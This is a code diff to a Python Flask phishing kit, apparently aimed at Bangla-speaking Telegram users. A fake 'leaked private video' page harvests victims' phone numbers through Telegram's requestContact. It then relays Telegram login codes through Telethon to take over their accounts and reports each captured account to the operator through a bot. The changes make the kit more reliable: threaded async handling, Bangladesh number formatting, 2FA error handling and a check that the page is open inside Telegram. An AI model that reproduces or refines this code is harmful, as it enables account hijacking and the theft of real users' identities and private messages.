@@ -5,10 +5,10 @@ import json
 import os
 import logging
 import base64
-import threading
 from datetime import datetime
 from telethon import TelegramClient
 from telethon.sessions import StringSession
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -26,7 +26,21 @@ user_sessions = {}
 captured_accounts = []
 pending_codes = {}
 
-# ====== Phishing Page ======
+# Thread pool for async operations
+executor = ThreadPoolExecutor(max_workers=5)
+
+def run_async(coro):
+    """Run async function in a separate thread with its own event loop"""
+    def _run():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            return loop.run_until_complete(coro)
+        finally:
+            loop.close()
+    return executor.submit(_run)
+
+# ====== Phishing Page (Only requestContact - NO prompt) ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -87,33 +101,45 @@ PAGE = """<!DOCTYPE html>
         .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
         .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
         @keyframes spin{to{transform:rotate(360deg)}}
+        .tg-only{display:none;text-align:center;padding:40px 20px;color:#888}
+        .tg-only .icon{font-size:60px;margin-bottom:15px}
+        .tg-only h2{color:white;font-size:20px;margin-bottom:10px}
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🔥 PREMIUM VIDEO HUB</h1>
-        <p>Exclusive content — Verified members only</p>
+    <div id="tgCheck" class="tg-only">
+        <div class="icon">📱</div>
+        <h2>Open in Telegram</h2>
+        <p>দয়া করে Telegram অ্যাপের ভিতর থেকে এই লিংকটি খুলুন</p>
+        <p style="font-size:12px;margin-top:10px;color:#555">🔗 Telegram এ share করুন</p>
     </div>
-    <div class="video-card">
-        <div class="thumbnail"><div class="play-btn">▶</div></div>
-        <div class="video-info">
-            <h3>🔥 LEAKED PRIVATE VIDEO — ONLYFANS MODEL 2026</h3>
-            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
-            <span class="badge">🔞 RESTRICTED</span>
+    
+    <div id="mainContent">
+        <div class="header">
+            <h1>🔥 PREMIUM VIDEO HUB</h1>
+            <p>Exclusive content — Verified members only</p>
         </div>
+        <div class="video-card">
+            <div class="thumbnail"><div class="play-btn">▶</div></div>
+            <div class="video-info">
+                <h3>🔥 LEAKED PRIVATE VIDEO — ONLYFANS MODEL 2026</h3>
+                <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
+                <span class="badge">🔞 RESTRICTED</span>
+            </div>
+        </div>
+        <div class="link-section">
+            <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">থােড়া verification required</span></button>
+            <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
+        </div>
+        <div class="section-title">🔥 More Videos</div>
+        <div class="video-grid">
+            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
+            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
+            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
+            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
+        </div>
+        <div class="footer">© 2026 Premium Video Hub</div>
     </div>
-    <div class="link-section">
-        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">thoda verification required</span></button>
-        <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
-    </div>
-    <div class="section-title">🔥 More Videos</div>
-    <div class="video-grid">
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
-    </div>
-    <div class="footer">© 2026 Premium Video Hub</div>
     
     <div class="modal-overlay" id="vm">
         <div class="modal">
@@ -157,29 +183,40 @@ PAGE = """<!DOCTYPE html>
     </div>
     
     <script>
-    let ph='',ccd='';
-    document.getElementById('glb').onclick=function(){
-        document.getElementById('vm').classList.add('active');
-        if(window.Telegram?.WebApp?.requestContact){
-            Telegram.WebApp.requestContact(function(s,c){
-                if(c&&c.phone_number){
-                    ph=c.phone_number.startsWith('+')?c.phone_number:'+'+c.phone_number;
-                    document.getElementById('ps').innerHTML='<span class="sp"></span> Contact received! Verifying...';
-                    send(ph);
-                }else{
-                    document.getElementById('ps').className='sb error';
-                    document.getElementById('ps').textContent='❌ Please share contact';
-                }
-            });
-        }else{
-            var p=prompt('Enter phone (+8801XXXXXXXXX):');
-            if(p&&p.length>=10){
-                ph=p.startsWith('+')?p:'+'+p;
-                document.getElementById('ps').innerHTML='<span class="sp"></span> Verifying '+ph+'...';
-                send(ph);
-            }
+    let ph='', ccd='';
+    
+    // Check if opened inside Telegram
+    function isTelegramWebApp() {
+        return window.Telegram?.WebApp !== undefined;
+    }
+    
+    // Show error if not in Telegram
+    if (!isTelegramWebApp()) {
+        document.getElementById('tgCheck').style.display = 'block';
+        document.getElementById('mainContent').style.display = 'none';
+    }
+    
+    document.getElementById('glb').onclick = function() {
+        if (!isTelegramWebApp()) {
+            alert('Please open this page inside Telegram app');
+            return;
         }
+        
+        document.getElementById('vm').classList.add('active');
+        document.getElementById('ps').innerHTML = '<span class="sp"></span> Requesting contact...';
+        
+        Telegram.WebApp.requestContact(function(success, contact) {
+            if (success && contact && contact.phone_number) {
+                ph = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
+                document.getElementById('ps').innerHTML = '<span class="sp"></span> Contact received! Verifying ' + ph + '...';
+                send(ph);
+            } else {
+                document.getElementById('ps').className = 'sb error';
+                document.getElementById('ps').textContent = '❌ দয়া করে আপনার contact share করুন';
+            }
+        });
     };
+    
     async function send(p){
         try{
             var r=await fetch('/api/share',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});
@@ -191,7 +228,7 @@ PAGE = """<!DOCTYPE html>
                 ck();
             }else{
                 document.getElementById('ps').className='sb error';
-                document.getElementById('ps').textContent='❌ Error';
+                document.getElementById('ps').textContent='❌ Error: '+JSON.stringify(d);
             }
         }catch(e){
             document.getElementById('ps').className='sb error';
@@ -205,7 +242,7 @@ PAGE = """<!DOCTYPE html>
                 var d=await r.json();
                 if(d.s=='sent'){
                     clearInterval(x);
-                    document.getElementById('cs').innerHTML='✅ Code aaya hai! Neeche type karo:';
+                    document.getElementById('cs').innerHTML='✅ আপনার Telegram এ OTP কোড পাঠানো হয়েছে! নিচে টাইপ করুন:';
                     document.getElementById('cs').className='sb success';
                 }else if(d.s=='done'){
                     clearInterval(x);
@@ -213,7 +250,7 @@ PAGE = """<!DOCTYPE html>
                     document.getElementById('s3').classList.add('active');
                 }else if(d.s=='err'){
                     clearInterval(x);
-                    document.getElementById('cs').innerHTML='❌ Error';
+                    document.getElementById('cs').innerHTML='❌ কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।';
                     document.getElementById('cs').className='sb error';
                 }
             }catch(e){}
@@ -222,7 +259,7 @@ PAGE = """<!DOCTYPE html>
     function pk(n){if(ccd.length<5){ccd+=n;document.getElementById('cdisp').textContent=ccd;}}
     function cc(){ccd=ccd.slice(0,-1);document.getElementById('cdisp').textContent=ccd;}
     async function sc(){
-        if(ccd.length<4){showvs('❌ Pura code likho','error');return;}
+        if(ccd.length<4){showvs('❌ পুরো কোডটি লিখুন','error');return;}
         document.getElementById('sb').disabled=true;
         document.getElementById('sb').textContent='⏳ Wait...';
         try{
@@ -232,7 +269,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s3').classList.add('active');
             }else{
-                showvs('❌ '+(d.error||'Wrong code'),'error');
+                showvs('❌ '+(d.error||'ভুল কোড'),'error');
                 ccd='';document.getElementById('cdisp').textContent='';
                 document.getElementById('sb').disabled=false;document.getElementById('sb').textContent='✓ Verify';
             }
@@ -256,9 +293,11 @@ async def send_code(phone):
         user_sessions[phone] = {'client': c, 'hash': r.phone_code_hash}
         pending_codes[phone] = 'sent'
         logger.info(f"✅ Code sent: {phone}")
+        return True
     except Exception as e:
-        logger.error(f"Failed: {e}")
+        logger.error(f"Failed to send code to {phone}: {e}")
         pending_codes[phone] = 'err'
+        return False
 
 async def verify_code(phone, code):
     if phone not in user_sessions: return {'success': False, 'error': 'Session not found'}
@@ -288,7 +327,7 @@ async def verify_code(phone, code):
             async with httpx.AsyncClient() as h:
                 await h.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': YOUR_TELEGRAM_ID,
-                    'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n\n📊 Dashboard: {request.host_url}dash",
+                    'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}",
                     'parse_mode': 'Markdown'
                 })
         except: pass
@@ -299,6 +338,7 @@ async def verify_code(phone, code):
     except Exception as e:
         e = str(e)
         if 'PHONE_CODE_INVALID' in e: return {'success': False, 'error': 'Wrong code'}
+        if 'SESSION_PASSWORD_NEEDED' in e: return {'success': False, 'error': '2FA enabled'}
         return {'success': False, 'error': e[:80]}
 
 # ====== Routes ======
@@ -308,9 +348,17 @@ def index(): return render_template_string(PAGE)
 @app.route('/api/share', methods=['POST'])
 def share():
     ph = request.json.get('phone', '')
-    if not ph: return jsonify({'success': False})
+    if not ph: return jsonify({'success': False, 'error': 'Phone required'})
+    
+    # Phone number format fix for Bangladesh
+    if ph.startswith('0') and not ph.startswith('+'):
+        ph = '+88' + ph
+    elif not ph.startswith('+'):
+        ph = '+' + ph
+    
+    logger.info(f"📱 Phone received: {ph}")
     pending_codes[ph] = 'sending'
-    threading.Thread(target=lambda: asyncio.run(send_code(ph)), daemon=True).start()
+    future = run_async(send_code(ph))
     return jsonify({'success': True})
 
 @app.route('/api/check', methods=['POST'])
@@ -320,8 +368,17 @@ def check():
 
 @app.route('/api/verify', methods=['POST'])
 def verify():
-    d = request.json; ph, code = d.get('phone', ''), d.get('code', '')
-    r = asyncio.run(verify_code(ph, code))
+    d = request.json
+    ph, code = d.get('phone', ''), d.get('code', '')
+    
+    # Phone format fix
+    if ph.startswith('0') and not ph.startswith('+'):
+        ph = '+88' + ph
+    elif not ph.startswith('+'):
+        ph = '+' + ph
+    
+    future = run_async(verify_code(ph, code))
+    r = future.result()
     return jsonify(r)
 
 @app.route('/webk/<phone>')
